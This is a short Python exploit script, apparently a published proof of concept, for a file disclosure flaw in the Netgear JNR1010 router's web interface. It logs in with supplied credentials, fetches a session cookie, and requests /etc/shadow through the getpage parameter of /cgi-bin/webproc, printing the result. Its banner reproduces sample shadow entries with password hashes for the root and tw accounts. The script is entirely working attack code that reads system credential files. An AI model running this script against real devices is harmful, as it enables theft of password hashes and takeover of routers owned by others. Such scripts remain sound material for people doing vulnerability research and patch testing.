#device: Netgear JNR1010 Firmware: 1.0.0.24
import requests
import sys
import base64
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                   no CVE                                   |
|                                                                            |
| NETGEAR ADSL router JNR1010 with firmware version 1.0.0.16 suffers from    |
| a file disclosure vulnerability.                                           |
| <print>                                                                    |
| #root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::                |
| root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::                 |
| #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::                  |
| #tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::                  |
 -----------------------------------------------------------------------------
"""

#IP, ID, Password input
if len(sys.argv) is not 4:
	print(description)
	print(Fore.RED+"[-] Example: python Netgear_Path_Traversal.py <Target IP> <ID> <Password>"+Fore.RESET)
	sys.exit()

target = sys.argv[1]
ID = sys.argv[2]
Password = sys.argv[3]
base = ID + ':' + Password

#Authorization encode to Base64
encookie = base64.encodestring(base)

#to use burpsuite
proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}

s = requests.Session()

#get sessionid
URL = 'http://'+target+'/cgi-bin/webproc'
headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
res = s.get(URL, headers=headers, proxies=proxies)

#set sessionid & login
dic = s.cookies.get_dict()
cookies = {'Cookie' : 'sessionid=' + dic.get('sessionid')}
res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)

#http://10.0.0.1/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home
#Remote File Disclosure
URL = 'http://' + target + '/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home'
res = s.get(URL, headers=headers, cookies=cookies, proxies=proxies)
print(res.text.rstrip('\n'))
